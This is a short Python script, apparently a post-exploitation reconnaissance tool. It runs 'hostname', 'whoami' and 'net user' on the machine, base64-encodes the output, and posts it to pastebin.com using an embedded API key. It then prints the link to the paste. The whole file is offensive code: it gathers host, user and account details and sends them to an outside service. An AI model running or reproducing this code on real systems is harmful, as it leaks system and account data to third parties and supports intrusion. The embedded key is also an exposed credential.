import subprocess
import base64
import requests


def main():
    cmd = ['hostname', 'whoami', 'net user']
    lbl = ['hostname', 'user', 'privileges']
    msg = ''

    for (c, l) in zip(cmd, lbl):
        sp = subprocess.Popen(c, stdout=subprocess.PIPE)
        res = sp.communicate()[0]

        msg += f'{l}: {res}\n'

    msg_b64 = base64.b64encode(msg.encode('utf-8')).decode('utf-8')

    data = {'api_dev_key': 'CO0WtYLcyCgiOvvGmLnN9vWpzQsUKRoR', 'api_paste_code': msg_b64, 'api_option': 'paste'}
    response = requests.post('https://pastebin.com/api/api_post.php', data=data)

    print(f'Pastebin link: {response.text}')
    

if __name__ == '__main__':
    main()
